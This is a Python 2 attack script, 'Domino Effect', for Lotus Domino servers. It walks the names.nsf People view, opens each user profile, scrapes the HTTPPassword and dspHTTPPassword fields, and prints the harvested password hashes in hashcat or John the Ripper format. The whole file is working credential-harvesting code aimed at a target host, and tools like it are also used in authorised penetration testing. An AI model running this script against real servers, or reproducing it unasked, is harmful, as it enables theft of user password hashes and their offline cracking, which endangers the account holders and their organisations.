#!/usr/bin/env python2

import requests, re, BeautifulSoup, sys, argparse, os
requests.packages.urllib3.disable_warnings()


parser = argparse.ArgumentParser(description='Domino Effect - A Lotus Domino password hash tool by Jonathan Broche (@g0jhonny)', version="1.0")
parser.add_argument('system', help="IP address or hostname to harvest hashes from. ")
parser.add_argument('-u', '--uri', metavar='path', default="/names.nsf", help="Path to the names.nsf file. [Default: /names.nsf]")
outgroup = parser.add_argument_group(title="Output Options")
outgroup.add_argument('--hashcat', action='store_true',  help="Print results for use with hashcat.")
outgroup.add_argument('--john', action='store_true', help="Print results for use with John the Ripper.")

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()
print "\nDomino Effect {}\n".format(parser.version)

headers={'User-Agent':'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.63 Safari/534.3'}


try:
    response = requests.get("http://{}{}/People?OpenView".format(args.system, args.uri), verify=False, headers=headers, timeout=3)
except requests.exceptions.Timeout as e:
    print "[!] Timed out, try again."
    sys.exit(1)
except Exception as e:
        print e

soup = BeautifulSoup.BeautifulSoup(response.text)

links = []

#grab all user profile links
for link in soup.findAll('a'):
    if "OpenDocument" in link['href']:
        if link['href'] not in links:
	        links.append(link['href'])

hashes = {}
for link in links: #get user profile
    try:
        response = requests.get("http://{}{}".format(args.system, link), verify=False, headers=headers, timeout=2)
    except requests.exceptions.Timeout as e:
        pass
    except Exception as e:
        print e

    if response.text:
        soup = BeautifulSoup.BeautifulSoup(response.text)

        name = soup.find('input', {'name' : '$dspShortName'}).get('value').strip() #short name
        httppassword = soup.find('input', { "name" : "HTTPPassword"}).get('value').strip()
        dsphttppassword = soup.find('input', { "name" : "dspHTTPPassword"}).get('value').strip()
        
        if httppassword and httppassword not in hashes.keys():
            hashes[httppassword] = name
        elif dsphttppassword and dsphttppassword not in hashes.keys():
            hashes[dsphttppassword] = name      

if hashes: #output
    if args.hashcat or args.john:
        if args.hashcat:
            for h in hashes.keys():
                print h
        if args.john:
            for h, n in hashes.items():
                print "{}:{}".format(n,h)
    else:
        for h, n in hashes.items():
            print "[*] User: {} Hash: {}".format(n, h)


print "\n{} hashes obtained\n".format(len(hashes))
